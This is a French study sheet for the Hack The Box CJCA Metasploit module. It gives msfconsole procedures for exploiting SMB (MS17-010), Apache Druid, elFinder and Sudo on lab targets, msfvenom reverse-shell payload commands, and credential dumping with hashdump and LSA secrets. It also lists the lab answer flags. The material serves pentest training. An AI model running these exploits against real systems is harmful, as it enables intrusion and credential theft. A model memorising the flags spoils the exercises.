# 🎯 Fiche de révision HTB CJCA — Using the Metasploit Framework

> **Légende**
> - 📘 Résumé du cours (traduit en français)
> - 🔑 À retenir absolument
> - ⌨️ Commandes / requêtes importantes
> - ✅ Question, réponse en français, et **Réponse à mettre sur HTB**
> - 🧭 Procédure détaillée, étape par étape, pour retrouver la réponse
> - ⚠️ Passage reconstitué (absent du cours) ou incohérence repérée

---

## Sommaire

1. [Page 1 — Introduction to Metasploit](#page-1--introduction-to-metasploit)
2. [Page 2 — Introduction to MSFconsole](#page-2--introduction-to-msfconsole)
3. [Page 3 — Modules](#page-3--modules)
4. [Page 4 — Targets](#page-4--targets)
5. [Page 5 — Payloads](#page-5--payloads)
6. [Page 6 — Encoders](#page-6--encoders)
7. [Page 7 — Databases](#page-7--databases)
8. [Page 8 — Mixins](#page-8--mixins)
9. [Page 9 — Plugins](#page-9--plugins)
10. [Page 10 — Meterpreter](#page-10--meterpreter)
11. [Page 11 — Writing and Importing Modules](#page-11--writing-and-importing-modules)
12. [Page 12 — Firewall and IDS/IPS Evasion](#page-12--firewall-and-idsips-evasion)
13. [Page 13 — Metasploit-Framework Updates (August 2020)](#page-13--metasploit-framework-updates-august-2020)
14. [Mémo final : toutes les réponses HTB](#mémo-final--toutes-les-réponses-htb)
15. [Cheat-sheet du module](#cheat-sheet-du-module)

---

# 🔌 Bloc de connexion à la cible (valable pour toutes les pages avec cible)

## Option A — Depuis le Pwnbox

| Étape | Action |
|---|---|
| A1 | **Spawn Target**, note l'IP cible |
| A2 | **View Linux Pwnbox**, ouvre un terminal |
| A3 | `msfconsole -q` pour démarrer sans bannière |

## Option B — Depuis ta propre machine (VPN)

| Étape | Commande |
|---|---|
| B1 | **OVPN** → **Download VPN Connection File** |
| B2 | `sudo openvpn ~/Downloads/FICHIER.ovpn` (laisser ouvert, attendre `Initialization Sequence Completed`) |
| B3 | `ip -4 addr show tun0` (IP `10.10.14.x`) |
| B4 | **Spawn Target**, note l'IP, `ping -c 2 IP_CIBLE` |

## Réglages de base msfconsole à chaque nouvelle cible
```bash
msfconsole -q                 # démarre sans bannière
db_status                     # vérifie la connexion à la base PostgreSQL
workspace -a Target_1         # crée/choisit un workspace dédié
setg RHOSTS IP_CIBLE          # cible persistante pour toute la session
setg LHOST tun0               # ton IP d'écoute (ou l'IP VPN explicite)
```

---

# Page 1 — Introduction to Metasploit

## 📘 Résumé

- **Metasploit Project** : plateforme de pentest modulaire écrite en **Ruby**, permettant d'écrire, tester et exécuter du code d'exploitation (modules déjà développés ou code personnalisé).
- Deux versions :

| Version | Nature |
|---|---|
| **Metasploit Framework** | Open source, gratuit, piloté par la communauté |
| **Metasploit Pro** | Commercial, payant, orienté entreprise |

### Fonctionnalités exclusives de Metasploit Pro
Task Chains, Social Engineering, Vulnerability Validations, **GUI**, Quick Start Wizards, intégration **Nexpose**, Proxy Pivot, VPN Pivoting, Phishing Wizard, Web Interface, Reporting, gestion d'équipe (Team Collaboration), etc.

### msfconsole (l'interface principale du Framework)
- Interface **tout-en-un** centralisée pour accéder à presque toutes les fonctionnalités du Framework.
- Avantages : seule interface qui donne accès à la totalité des fonctionnalités, la plus stable, support complet du **readline** (tabulation, complétion de commandes), exécution de commandes externes.

### Architecture (`/usr/share/metasploit-framework`)
| Dossier | Contenu |
|---|---|
| `data`, `lib` | Fichiers fonctionnels du cœur |
| `documentation` | Détails techniques du projet |
| `modules/` | `auxiliary`, `encoders`, `evasion`, `exploits`, `nops`, `payloads`, `post` |
| `plugins/` | Scripts `.rb` chargeables (Nessus, Nexpose, sqlmap, …) |
| `scripts/` | Scripts Meterpreter et autres (`meterpreter`, `ps`, `resource`, `shell`) |
| `tools/` | Utilitaires en ligne de commande (`context`, `exploit`, `password`, `recon`, …) |

### Structure d'un engagement MSF (5 catégories)
1. **Enumeration** (Service Validation, Vulnerability Research)
2. **Preparation** (Code Auditing)
3. **Exploitation** (Module Execution)
4. **Privilege Escalation**
5. **Post-Exploitation** (Pivoting, Data Exfiltration)

## 🔑 À retenir
- Metasploit = Ruby, modulaire, gratuit (Framework) vs payant (Pro, GUI).
- `/usr/share/metasploit-framework/modules/` : 7 catégories (auxiliary, encoders, evasion, exploits, nops, payloads, post).
- 5 étapes d'un engagement : Enumeration → Preparation → Exploitation → Privilege Escalation → Post-Exploitation.

## ✅ Questions de la page 1

### ❓ Question 1 — Version avec GUI

| | |
|---|---|
| **Question (EN)** | Which version of Metasploit comes equipped with a GUI interface? |
| **Question (FR)** | Quelle version de Metasploit est équipée d'une interface graphique (GUI) ? |
| **Réponse (FR)** | Metasploit Pro |
| **Réponse à mettre sur HTB** | `Metasploit Pro` |

**🧭 Procédure (aucune cible nécessaire, tout est dans le texte du cours)**
1. Section **Metasploit Pro**, repère la liste des fonctionnalités additionnelles : « GUI » y figure explicitement.
2. Saisis exactement : `Metasploit Pro`

---

### ❓ Question 2 — Commande pour la version gratuite

| | |
|---|---|
| **Question (EN)** | What command do you use to interact with the free version of Metasploit? |
| **Question (FR)** | Quelle commande utilise-t-on pour interagir avec la version gratuite de Metasploit ? |
| **Réponse (FR)** | `msfconsole` |
| **Réponse à mettre sur HTB** | `msfconsole` |

**🧭 Procédure**
1. Section **Metasploit Framework Console** : « msfconsole is probably the most popular interface to the Metasploit Framework ».
2. Saisis exactement : `msfconsole`

---

# Page 2 — Introduction to MSFconsole

## 📘 Résumé

### Lancement
```bash
msfconsole        # avec bannière ASCII
msfconsole -q     # sans bannière (quiet)
```

### Mise à jour
```bash
sudo apt update && sudo apt install metasploit-framework
```
(remplace l'ancien `msfupdate`, exécuté hors msfconsole.)

### Démarche générale avant tout exploit : l'**Enumeration**
Identifier les services exposés (HTTP ? FTP ? SQL ?) et leurs **versions exactes** — c'est la clé pour savoir si la cible est vulnérable à un exploit connu.

## 🔑 À retenir
- `-q` = pas de bannière, démarrage plus rapide.
- L'énumération précède toujours l'exploitation : la version du service détermine l'exploit applicable.

## ✅ Questions
Aucune question sur cette page.

---

# Page 3 — Modules

## 📘 Résumé

### Syntaxe d'un module
```text
<No.> <type>/<os>/<service>/<name>
```
Exemple : `794 exploit/windows/ftp/scriptftp_list`

| Champ | Rôle |
|---|---|
| **No.** | Index affiché après une recherche, pour sélection rapide (`use <no.>`) |
| **Type** | Catégorie fonctionnelle (voir tableau ci-dessous) |
| **OS** | Système cible |
| **Service** | Service vulnérable visé (ou activité générale pour `post`/`auxiliary`, ex. `gather`) |
| **Name** | Action précise réalisée |

### Les 7 types de modules
| Type | Description |
|---|---|
| **Auxiliary** | Scan, fuzzing, sniffing, admin — fonctions d'assistance |
| **Encoders** | Garantissent l'intégrité du payload jusqu'à destination |
| **Exploits** | Exploitent une vulnérabilité pour permettre la livraison du payload |
| **NOPs** | Maintiennent une taille de payload constante entre les tentatives |
| **Payloads** | Code exécuté à distance, rappelle l'attaquant (shell) |
| **Plugins** | Scripts additionnels intégrables à l'évaluation |
| **Post** | Collecte d'infos, pivoting, etc. (post-exploitation) |

🔑 Seuls **Auxiliary**, **Exploits** et **Post** peuvent être chargés avec `use <no.>` comme modules « initiateurs ».

### ⌨️ Recherche de modules
```bash
search eternalromance                       # recherche simple
search eternalromance type:exploit          # filtre par type
search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

#### Mots-clés de recherche disponibles
`aka`, `author`, `arch`, `bid`, `cve`, `edb`, `check`, `date`, `description`, `fullname`, `mod_time`, `name`, `path`, `platform`, `port`, `rank`, `ref`/`reference`, `target`, `type`.

#### Options et tri
```bash
search -S "regex"      # filtre par motif regex
search -s rank -r       # trie par rang, ordre descendant
search -u               # utilise le module directement s'il n'y a qu'un seul résultat
```

### Sélection et configuration d'un module
```bash
use 0                         # sélectionne par index
show options                  # affiche les paramètres requis (colonne "Required": yes/no)
set RHOSTS 10.10.10.40        # définit la cible pour la session en cours
setg RHOSTS 10.10.10.40       # définit la cible de façon persistante (jusqu'au redémarrage)
set LHOST tun0                # définit l'adresse d'écoute locale
info                          # infos détaillées sur le module (description, CVE, auteurs, targets)
run                           # exécute le module
```

### Exemple complet (MS17-010 / EternalRomance)
```bash
nmap -sV 10.10.10.40                        # repère SMB sur le port 445
search ms17_010
use 1                                       # exploit/windows/smb/ms17_010_psexec
set RHOSTS 10.10.10.40
run
```
Résultat typique : session Meterpreter ou shell ouverte, `getuid` → `NT AUTHORITY\SYSTEM`.

## 🔑 À retenir
- `setg` = persistant pour toute la session msfconsole (contrairement à `set`).
- `info` avant tout : description, CVE, cibles disponibles, options requises.
- Un échec d'exploit **ne prouve pas** l'absence de la vulnérabilité — seulement que ce module précis n'a pas fonctionné (nécessite parfois un ajustement manuel).

## ✅ Questions
Aucune question sur cette page (exemple traité directement en pratique à la page suivante).

---

# Page 4 — Targets

## 📘 Résumé

- Les **targets** sont des identifiants uniques de version d'OS qui adaptent l'exploit à la cible précise (service pack, version de langue, version logicielle).
- `show targets` en dehors d'un module sélectionné → erreur (`No exploit module selected`).
- Avec un module sélectionné : liste des cibles possibles, souvent avec une option `0 = Automatic` qui déclenche une détection de service avant l'attaque.

```bash
show targets
set target 6          # sélectionne une cible précise par index
```

### Pourquoi les targets diffèrent
Le **return address** (adresse de retour) utilisé par l'exploit change selon :
- Le service pack installé
- La langue du système (pack linguistique = adresses décalées)
- Les versions logicielles présentes (hooks modifiant les adresses)

Types d'adresses de retour : `jmp esp`, saut vers un registre précis, `pop/pop/ret`. Pour identifier une cible correctement :
1. Obtenir une copie des binaires de la cible.
2. Utiliser **msfpescan** pour localiser une adresse de retour adaptée.

## 🔑 À retenir
- `show targets` nécessite un module déjà sélectionné (`use`).
- `0 = Automatic` fait une détection avant l'exploitation, mais réduit parfois la fiabilité par rapport à un ciblage précis.

## ✅ Question — Exploiter Apache Druid

| | |
|---|---|
| **Question (EN)** | Exploit the Apache Druid service and find the flag.txt file. Submit the contents of this file as the answer. |
| **Question (FR)** | Exploite le service Apache Druid et trouve le fichier `flag.txt`. Donne son contenu. |
| **Réponse (FR)** | Flag HTB |
| **Réponse à mettre sur HTB** | `HTB{MSF_Expl01t4t10n}` |

**🧭 Procédure complète**

**Partie 0 : connexion à la cible**
1. **Spawn Target** → `IP_CIBLE`.
2. Pwnbox ou VPN (voir Bloc de connexion).
3. Scan initial : `nmap -sV -p- IP_CIBLE` pour confirmer Apache Druid (port par défaut 8888 pour la console, 8081/8082 pour certains services internes).

**Partie 1 : recherche et exploitation**
4. Lance msfconsole : `msfconsole -q`.
5. Cherche le module Druid :
   ```bash
   search druid
   ```
6. Sélectionne le module trouvé (ex. `exploit/linux/http/apache_druid_js_rce` ou équivalent selon la version chargée dans ton Framework) :
   ```bash
   use <index>
   show options
   set RHOSTS IP_CIBLE
   set LHOST tun0
   run
   ```
7. Une fois le shell/Meterpreter obtenu, cherche le flag :
   ```bash
   # Dans un shell Meterpreter :
   shell
   find / -iname "flag.txt" 2>/dev/null
   cat /chemin/trouvé/flag.txt
   ```

✔️ **Plan B** si aucun module `search druid` n'apparaît : vérifier la CVE connue d'Apache Druid (ex. CVE-2021-25646, RCE via JavaScript dans une requête), chercher un module équivalent sur ExploitDB avec `searchsploit druid`, puis le porter manuellement dans `/usr/share/metasploit-framework/modules/exploits/` (voir page 11).

**Partie 2 : validation**
8. Saisis le contenu exact du flag → **Submit**.

---

# Page 5 — Payloads

## 📘 Résumé

Un **payload** est le module qui, combiné à l'exploit, retourne un accès (souvent un shell) à l'attaquant après que l'exploit a contourné le fonctionnement normal du service vulnérable.

### 3 types de payloads
| Type | Description | Exemple de nom |
|---|---|---|
| **Singles** (inline) | Autonomes, tout-en-un, plus stables mais plus volumineux | `windows/shell_bind_tcp` |
| **Stagers** | Petits, fiables, initient la connexion sortante vers l'attaquant | `windows/shell/bind_tcp` (partie stager) |
| **Stages** | Composants téléchargés par le stager, sans limite de taille (Meterpreter, VNC Injection) | partie `meterpreter`, `vncinject` |

🔑 Le `/` dans le nom distingue un payload **staged** (`windows/shell/bind_tcp`) d'un payload **single** (`windows/shell_bind_tcp`).

### Stage0 et Stage1
- **Stage0** : shellcode initial envoyé au service vulnérable, établit une **connexion de retour** (reverse connection) vers l'attaquant.
- Les connexions **reverse** (`reverse_tcp`, `reverse_https`) sont souvent plus efficaces que les connexions **bind** car elles exploitent la confiance accordée au trafic **sortant** par les pare-feux.
- **Stage1** : payload plus volumineux envoyé une fois le canal stable établi (ex. accès shell complet).

### Payload Meterpreter
- Utilise l'**injection de DLL** pour une connexion stable et difficile à détecter, persistante possible au redémarrage.
- Réside **entièrement en mémoire**, aucune trace sur disque → difficile à détecter avec les techniques forensiques classiques.
- Chargement/déchargement dynamique de scripts et plugins.

### ⌨️ Recherche et sélection de payloads
```bash
show payloads                              # liste complète (très longue)
grep meterpreter show payloads             # filtre les résultats contenant "meterpreter"
grep -c meterpreter show payloads          # compte les résultats
grep meterpreter grep reverse_tcp show payloads   # chaîne plusieurs grep
set payload 15                             # sélectionne par index après filtrage
```

### Table des payloads Windows courants
| Payload | Description |
|---|---|
| `generic/custom` | Listener générique, multi-usage |
| `generic/shell_bind_tcp` | Shell normal, connexion TCP bind |
| `generic/shell_reverse_tcp` | Shell normal, connexion TCP reverse |
| `windows/x64/exec` | Exécute une commande arbitraire |
| `windows/x64/loadlibrary` | Charge une librairie x64 arbitraire |
| `windows/x64/messagebox` | Ouvre une boîte de dialogue (démonstration) |
| `windows/x64/shell_reverse_tcp` | Shell, single payload, reverse TCP |
| `windows/x64/shell/reverse_tcp` | Shell, stager + stage, reverse TCP |
| `windows/x64/meterpreter/$` | Meterpreter + variantes |
| `windows/x64/powershell/$` | Sessions PowerShell interactives |
| `windows/x64/vncinject/$` | Serveur VNC par injection réflective |

🔑 **Empire** et **Cobalt Strike** sont d'autres frameworks de payloads très utilisés en pentest professionnel, hors du périmètre de ce module.

### Exemple complet : exploitation EternalBlue avec Meterpreter
```bash
use exploit/windows/smb/ms17_010_eternalblue
show payloads
grep meterpreter grep reverse_tcp show payloads
set payload 15                              # windows/x64/meterpreter/reverse_tcp
show options                                # LHOST, LPORT apparaissent désormais
set LHOST tun0
set RHOSTS 10.10.10.40
run
```
Résultat : session Meterpreter, `getuid` → `NT AUTHORITY\SYSTEM`.

🔑 Dans Meterpreter, `whoami` **n'existe pas** : utiliser `getuid` (équivalent Linux-style de Meterpreter).

### Navigation Meterpreter de base
```text
cd Users
ls
shell          # ouvre un vrai shell cmd.exe Windows (channel dédié)
```

## 🔑 À retenir
- Single vs Stager/Stage : `/` dans le nom = staged.
- Reverse > Bind pour contourner les règles de pare-feu sortantes.
- Meterpreter = 100% mémoire, pas de trace disque.
- `getuid` (pas `whoami`) dans Meterpreter.

## ✅ Question — EternalRomance et flag Administrator

| | |
|---|---|
| **Question (EN)** | Use the Metasploit-Framework to exploit the target with EternalRomance. Find the flag.txt file on Administrator's desktop and submit the contents as the answer. |
| **Question (FR)** | Utilise Metasploit pour exploiter la cible avec EternalRomance. Trouve `flag.txt` sur le bureau d'Administrator et donne son contenu. |
| **Réponse (FR)** | Flag HTB |
| **Réponse à mettre sur HTB** | `HTB{MSF-W1nD0w5-3xPL01t4t10n}` |

**🧭 Procédure complète**

**Partie 0 : connexion à la cible**
1. **Spawn Target** → `IP_CIBLE`.
2. Pwnbox ou VPN.
3. `nmap -sV -p445 IP_CIBLE` pour confirmer SMB ouvert.

**Partie 1 : recherche et exploitation**
4. `msfconsole -q`
5. ```bash
   search ms17_010
   ```
6. Sélectionne EternalRomance/EternalSynergy/EternalChampion :
   ```bash
   use exploit/windows/smb/ms17_010_psexec
   show options
   set RHOSTS IP_CIBLE
   setg LHOST tun0
   run
   ```
7. Attends l'ouverture de la session (Meterpreter ou shell).
8. Confirme les privilèges :
   ```bash
   getuid
   # NT AUTHORITY\SYSTEM
   ```

**Partie 2 : lecture du flag**
9. Navigue vers le bureau d'Administrator :
   ```bash
   # dans Meterpreter :
   cd C:\\Users\\Administrator\\Desktop
   ls
   cat flag.txt
   ```
   ou en shell Windows :
   ```cmd
   type C:\Users\Administrator\Desktop\flag.txt
   ```

✔️ **Plan B** si `ms17_010_psexec` échoue : essaie `exploit/windows/smb/ms17_010_eternalblue` (variante plus ancienne mais parfois plus fiable selon le patch level exact de la cible), ou lance d'abord le scanner de vérification :
```bash
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS IP_CIBLE
run
```

**Partie 3 : validation**
10. Saisis le contenu exact du flag → **Submit**.

---

# Page 6 — Encoders

## 📘 Résumé

Les **Encoders** servent à :
1. Rendre un payload compatible avec différentes architectures (`x64`, `x86`, `sparc`, `ppc`, `mips`).
2. Retirer les **bad characters** (opcodes hexadécimaux qui cassent le payload sur certains systèmes).
3. Historiquement, aider à l'évasion antivirus/IPS — rôle **très réduit aujourd'hui** (heuristique, ML, deep packet inspection ont rattrapé les encodeurs classiques).

### Shikata Ga Nai (SGN)
- Encodeur **polymorphe XOR additif** historiquement le plus utilisé (nom japonais : « on n'y peut rien »).
- Autrefois très difficile à détecter ; aujourd'hui **largement détecté** par les antivirus modernes.

### Avant/après 2015 : msfpayload/msfencode → msfvenom
```bash
# Ancienne méthode (dépréciée, séparée en 2 outils) :
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai

# Méthode actuelle (fusionnée dans msfvenom) :
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

### ⌨️ Lister les encodeurs compatibles avec un module/payload
```bash
show encoders
```
Résultat filtré automatiquement selon l'architecture du payload sélectionné (ex. peu d'encodeurs compatibles x64, beaucoup plus pour x86).

### Itérations multiples
```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o payload.exe
```
`-i 10` : 10 itérations d'encodage successives (chaque itération change la taille et la forme du shellcode) — **toujours insuffisant seul** face aux AV modernes (le cours montre ~51-52/65 détections même après 10 itérations).

## 🔑 À retenir
- Encodeurs = compatibilité d'architecture + suppression de bad characters, **pas** une solution d'évasion AV fiable aujourd'hui.
- `show encoders` filtre selon le payload actif.
- `-i N` = nombre d'itérations d'encodage.

## ✅ Questions
Aucune question sur cette page.

---

# Page 7 — Databases

## 📘 Résumé

msfconsole s'appuie sur **PostgreSQL** pour stocker les résultats de scan, hosts, services, identifiants, loot, etc.

### ⌨️ Initialisation
```bash
sudo service postgresql status
sudo systemctl start postgresql
sudo msfdb init                 # crée et initialise la base MSF
sudo msfdb status                # vérifie l'état
sudo msfdb run                   # démarre la base ET msfconsole connecté

# En cas d'erreur après un msfdb init :
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q
db_status
```

### Commandes de base de données (dans msfconsole)
```bash
help database        # aide complète
db_status             # état de la connexion
db_connect            # connexion à une base existante
db_disconnect          # déconnexion
db_import fichier.xml  # importe un scan (Nmap XML, etc.)
db_export -f xml backup.xml   # exporte la base (formats : xml, pwdump)
db_nmap -sV -sS IP     # lance Nmap directement depuis msfconsole, résultats stockés en base
db_rebuild_cache       # reconstruit le cache des modules
hosts                  # table des hôtes découverts
services               # table des services découverts
notes                  # notes stockées
loot                   # hash dumps, fichiers extraits
vulns                  # vulnérabilités enregistrées
workspace               # gestion des workspaces
```

### Workspaces
Équivalent de « dossiers de projet » pour séparer les résultats de plusieurs cibles/réseaux.
```bash
workspace                    # liste (* = workspace actif)
workspace -a Target_1        # ajoute et active
workspace Target_1           # bascule vers ce workspace
workspace -d Target_1        # supprime
workspace -D                 # supprime tous les workspaces
```

### Hosts / Services / Credentials / Loot
| Commande | Rôle |
|---|---|
| `hosts -a`, `hosts -d` | Ajouter / supprimer des hôtes |
| `hosts -u` | N'afficher que les hôtes « up » |
| `services -s <nom>` | Rechercher par nom de service |
| `creds add user:admin password:pass123` | Ajouter des identifiants manuellement |
| `creds -t ntlm` | Filtrer par type (password, ntlm, hash) |
| `loot -f fichier -i info -a IP -t type` | Ajouter du butin (hash, config, etc.) |

## 🔑 À retenir
- `msfdb init` doit être relancé après une mise à jour qui casse la config (`msfdb reinit` + copie du `database.yml`).
- `db_nmap` combine scan Nmap **et** stockage automatique en base.
- `workspace` = isolation des cibles/projets dans la même base.

## ✅ Questions
Aucune question sur cette page.

---

# Page 8 — Mixins

## 📘 Résumé

- Metasploit est écrit en **Ruby** (langage orienté objet). Les **Mixins** sont des classes utilisées comme méthodes par d'autres classes **sans** être leur classe parente : c'est de l'**inclusion**, pas de l'héritage.
- Utilité des Mixins :
  1. Offrir **beaucoup de fonctionnalités optionnelles** à une classe.
  2. Réutiliser **une** fonctionnalité pour **plusieurs** classes différentes.
- Implémentation Ruby : mot-clé `include` suivi du nom du module.

### Exemples rencontrés dans un module d'exploit
```ruby
include Msf::Exploit::Remote::HttpClient   # client HTTP pour exploiter un serveur HTTP
include Msf::Exploit::PhpEXE                # génère un payload PHP de 1er niveau
include Msf::Exploit::FileDropper           # transfère des fichiers + nettoyage après session
include Msf::Auxiliary::Report              # rapporte des données à la base MSF
```

## 🔑 À retenir
- Mixin = inclusion de fonctionnalités, pas héritage de classe.
- Pas besoin de maîtriser les Mixins pour débuter, mais utile pour comprendre la complexité des modules personnalisés.

## ✅ Questions
Aucune question sur cette page.

---

# Page 9 — Plugins

## 📘 Résumé

Les **Plugins** sont des logiciels tiers déjà publiés, intégrés au Framework avec l'accord de leurs créateurs (versions commerciales Community Edition ou projets individuels).

- Automatisent la documentation : hôtes, services, vulnérabilités visibles directement dans msfconsole sans ressaisir les paramètres d'un outil à l'autre.
- Fonctionnent directement avec l'**API**, peuvent manipuler tout le Framework, automatiser des tâches répétitives, ajouter de nouvelles commandes.

### ⌨️ Utilisation
```bash
ls /usr/share/metasploit-framework/plugins/    # liste les plugins installés
load nessus                                    # charge un plugin
nessus_help                                    # aide spécifique au plugin chargé
```
Erreur si le plugin n'existe pas au chemin attendu : `[-] Failed to load plugin from ... cannot load such file`.

### Installer un nouveau plugin
```bash
git clone https://github.com/darkoperator/Metasploit-Plugins
sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
msfconsole -q
load pentest
help          # le menu d'aide est étendu avec les nouvelles commandes du plugin
```

### Plugins populaires préinstallés
`nmap`, `nexpose`, `nessus`, `mimikatz` (v1, obsolète), `stdapi`, `railgun`, `priv`, `incognito`, plugins **DarkOperator**.

## 🔑 À retenir
- Les plugins vivent dans `/usr/share/metasploit-framework/plugins/` et se chargent avec `load <nom>`.
- Chaque plugin ajoute ses propres commandes au menu d'aide de msfconsole.

## ✅ Questions
Aucune question sur cette page.

---

# Page 10 — Meterpreter

## 📘 Résumé

**Meterpreter** = payload multi-facettes, utilisant l'**injection de DLL**. Surnommé le « couteau suisse » du pentest.

### 3 objectifs de conception
| Objectif | Détail |
|---|---|
| **Stealthy** (furtif) | Réside entièrement en **mémoire**, écrit rien sur disque, migre de processus en processus. Communications **chiffrées AES** depuis MSF6 |
| **Powerful** (puissant) | Communication **canalisée** (channels) entre cible et attaquant ; ouverture d'un vrai shell OS dans un channel dédié |
| **Extensible** | Fonctionnalités chargeables/déchargeables **à l'exécution**, en réseau, sans reconstruction |

### Déroulé technique à l'exécution de l'exploit
1. La cible exécute le **stager initial** (bind, reverse, findtag, passivex, …).
2. Le stager charge la **DLL Reflective** (préfixe `Reflective`), qui gère le chargement/injection.
3. Le cœur Meterpreter s'initialise, établit un lien **chiffré AES** sur le socket, envoie un GET.
4. Chargement des **extensions** : toujours `stdapi`, et `priv` si droits administrateur — le tout chiffré AES.

### ⌨️ Commandes principales (`help` dans Meterpreter)
| Catégorie | Commandes clés |
|---|---|
| Core | `background`/`bg`, `sessions`, `migrate`, `load`, `channel`, `pivot` |
| Fichiers | `cat`, `cd`, `ls`/`dir`, `download`, `upload`, `search`, `checksum` |
| Réseau | `arp`, `ifconfig`/`ipconfig`, `netstat`, `portfwd`, `route` |
| Système | `getuid`, `getpid`, `ps`, `kill`, `shell`, `sysinfo`, `reg`, `clearev` |
| Interface | `screenshot`, `screenshare`, `keyscan_start/stop/dump`, `webcam_snap` |
| Élévation (priv) | `getsystem`, `hashdump` |

### Exemple complet : exploiter IIS 6.0 (WebDAV Upload)
```bash
db_nmap -sV -p- -T5 -A 10.10.10.15
search iis_webdav_upload_asp
use 0
set RHOST 10.10.10.15
set LHOST tun0
run
```
Résultat : session 1, mais `getuid` → `Access is denied` (droits limités, IIS APPPOOL\Web).

### Migration de processus (`steal_token`)
```bash
ps                           # liste les processus, repère un token plus privilégié
steal_token 1836             # vole le token du PID indiqué (NT AUTHORITY\NETWORK SERVICE)
getuid
```

### Local Exploit Suggester (recon post-exploitation)
```bash
background                              # passe la session en arrière-plan
search local_exploit_suggester
use post/multi/recon/local_exploit_suggester
set SESSION 1
run                                      # liste les exploits locaux probables
```
Puis sélectionner un exploit local suggéré (ex. `ms15_051_client_copy_image`, `ms10_015_kitrap0d`) :
```bash
use exploit/windows/local/ms15_051_client_copy_image
set session 1
set LHOST tun0
run
getuid       # NT AUTHORITY\SYSTEM
```

### Post-exploitation : hashes et secrets
```bash
hashdump                 # hashes LM/NTLM du SAM
lsa_dump_sam              # dump SAM détaillé (clé système, RID, hash par utilisateur)
lsa_dump_secrets          # secrets LSA (mots de passe de service, clés DPAPI, etc.)
```

### Sessions et Jobs
```bash
sessions                        # liste les sessions actives
sessions -i 1                   # interagit avec la session 1
exploit -j                      # lance en arrière-plan (job)
jobs -l                          # liste les jobs actifs
jobs -k <id>                     # termine un job précis
jobs -K                          # termine tous les jobs
```

## 🔑 À retenir
- Meterpreter = 100% mémoire + AES (MSF6) + extensions dynamiques.
- `steal_token` = élévation latérale par vol de token d'un processus plus privilégié.
- `post/multi/recon/local_exploit_suggester` automatise la recherche de privesc locale.
- `exploit -j` / `jobs` = garder un port occupé en tâche de fond sans tuer la session.

## ✅ Questions de la page 10

### ❓ Question 1 — Nom de l'application web (code source HTML)

| | |
|---|---|
| **Question (EN)** | The target has a specific web application running that we can find by looking into the HTML source code. What is the name of that web application? |
| **Question (FR)** | La cible fait tourner une application web spécifique repérable dans le code source HTML. Quel est son nom ? |
| **Réponse (FR)** | elFinder |
| **Réponse à mettre sur HTB** | `elFinder` |

**🧭 Procédure complète**

**Partie 0 : connexion à la cible**
1. **Spawn Target** → `IP_CIBLE`.
2. Pwnbox ou VPN.
3. `nmap -sV -p- IP_CIBLE` pour repérer le port web (souvent 80/8080).

**Partie 1 : la recherche**
4. ```bash
   curl -s http://IP_CIBLE | grep -i "elfinder\|title\|generator"
   ```
5. Ou ouvre la page dans un navigateur, `[CTRL+U]` (View Page Source), cherche des références à des bibliothèques JS/CSS (chemins contenant souvent le nom du produit).
6. Le nom du produit apparaît dans un chemin type `/elfinder/`, un titre de page, ou un commentaire HTML.

**Partie 2 : validation**
7. Saisis `elFinder` (respecte la casse) → **Submit**.

---

### ❓ Question 2 — Utilisateur obtenu via exploit

| | |
|---|---|
| **Question (EN)** | Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with? |
| **Question (FR)** | Trouve l'exploit existant dans MSF et obtiens un shell sur la cible. Quel est le nom d'utilisateur du shell obtenu ? |
| **Réponse (FR)** | `www-data` |
| **Réponse à mettre sur HTB** | `www-data` |

**🧭 Procédure complète**

**Partie 1 : recherche de l'exploit**
1. `msfconsole -q`
2. ```bash
   search elfinder
   ```
3. Sélectionne le module trouvé (une CVE connue d'elFinder expose une RCE via upload de fichier ou commande d'archive, ex. `exploit/unix/webapp/elfinder_archive_cmd_injection` ou équivalent selon la version chargée).
4. ```bash
   use <index>
   show options
   set RHOSTS IP_CIBLE
   set TARGETURI /chemin_elfinder    # si requis par le module
   set LHOST tun0
   run
   ```

**Partie 2 : vérification**
5. Une fois la session ouverte (shell ou Meterpreter) :
   ```bash
   # shell direct :
   whoami
   # ou Meterpreter :
   getuid
   ```
   Résultat attendu : `www-data` (utilisateur par défaut du serveur web Apache/Nginx sur Linux).

✔️ **Plan B** si `search elfinder` ne renvoie rien : vérifier avec `searchsploit elfinder` et porter le script trouvé (voir page 11).

**Partie 3 : validation**
6. Saisis `www-data` → **Submit**.

---

### ❓ Question 3 — Flag après exploitation de Sudo (privesc)

| | |
|---|---|
| **Question (EN)** | The target system has an old version of Sudo running. Find the relevant exploit and get root access to the target system. Find the flag.txt file and submit the contents of it as the answer. |
| **Question (FR)** | La cible fait tourner une ancienne version de Sudo. Trouve l'exploit adapté et obtiens un accès root. Donne le contenu de `flag.txt`. |
| **Réponse (FR)** | Flag HTB |
| **Réponse à mettre sur HTB** | `HTB{5e55ion5_4r3_sw33t}` |

**🧭 Procédure complète**

**Partie 1 : identifier la version de Sudo**
1. Depuis le shell `www-data` obtenu à la question précédente :
   ```bash
   sudo -V
   # ou
   sudo --version
   ```
2. Note le numéro de version (ex. une version vulnérable à **CVE-2019-18634** « pwfeedback buffer overflow » ou **CVE-2021-3156** « Baron Samedit heap overflow », selon ce qui est détecté).

**Partie 2 : trouver et lancer l'exploit local**
3. Mets la session en arrière-plan :
   ```bash
   background
   ```
4. Cherche un module local correspondant :
   ```bash
   search sudo
   ```
5. Sélectionne le module trouvé, attache-le à la session :
   ```bash
   use exploit/linux/local/<nom_module_sudo>
   set SESSION 1
   set LHOST tun0
   run
   ```
6. Vérifie les privilèges obtenus :
   ```bash
   getuid     # Meterpreter
   # ou
   id         # shell
   ```

